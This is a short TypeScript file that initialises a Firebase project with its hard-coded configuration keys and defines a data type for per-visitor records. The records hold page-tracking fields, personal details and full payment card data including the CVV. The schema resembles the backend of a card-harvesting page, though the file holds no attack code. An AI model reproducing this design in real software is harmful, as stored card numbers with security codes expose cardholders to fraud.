import { initializeApp, getApps, getApp } from 'firebase/app';
import { getAuth } from 'firebase/auth';
import { getFirestore } from 'firebase/firestore';
import { getDatabase } from 'firebase/database';

const firebaseConfig = {
  apiKey: "AIzaSyDfG4yFh6d_sxh8Kimh__SUk-2NyOn9aYY",
  authDomain: "bake-d8b67.firebaseapp.com",
  databaseURL: "https://bake-d8b67-default-rtdb.firebaseio.com",
  projectId: "bake-d8b67",
  storageBucket: "bake-d8b67.firebasestorage.app",
  messagingSenderId: "884688063277",
  appId: "1:884688063277:web:9549527d76ffb4261461a4",
  measurementId: "G-TY6CNB49X4"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);

export { app, auth, db, database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}
